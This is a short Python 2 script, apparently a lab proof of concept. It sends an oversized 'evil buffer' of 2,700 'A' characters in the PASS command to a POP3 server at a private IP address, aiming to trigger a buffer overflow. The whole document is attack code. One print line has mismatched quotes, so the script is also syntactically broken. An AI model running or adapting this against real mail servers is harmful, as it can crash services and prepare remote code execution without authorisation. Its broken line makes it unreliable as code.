#!/usr/bin/python

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = 'A' * 2700

try:
	print "\nSending evil buffer..."
	s.connect(('192.168.30.35',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print('Done!")
except:
	print "Could not connect to POP3!"
